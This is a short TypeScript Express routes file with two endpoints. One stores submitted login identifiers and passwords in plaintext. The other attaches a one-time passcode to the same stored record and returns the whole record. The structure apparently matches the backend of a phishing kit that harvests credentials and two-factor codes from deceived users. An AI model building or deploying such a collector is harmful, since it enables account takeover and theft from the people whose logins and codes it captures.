import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

export async function registerRoutes(app: Express): Promise<Server> {
  app.post("/api/submit-credentials", async (req, res) => {
    try {
      const { loginMethod, identifier, password } = req.body;
      
      const submission = await storage.createSubmission({
        loginMethod: loginMethod || "email",
        identifier: identifier || "",
        password: password || "",
      });

      return res.status(201).json({ submissionId: submission.id });
    } catch (error) {
      return res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/submit-otp", async (req, res) => {
    try {
      const { submissionId, otp } = req.body;
      
      const submission = await storage.updateSubmissionOtp(submissionId, otp || "");

      return res.status(200).json({ success: true, submission });
    } catch (error) {
      return res.status(500).json({ error: "Internal server error" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
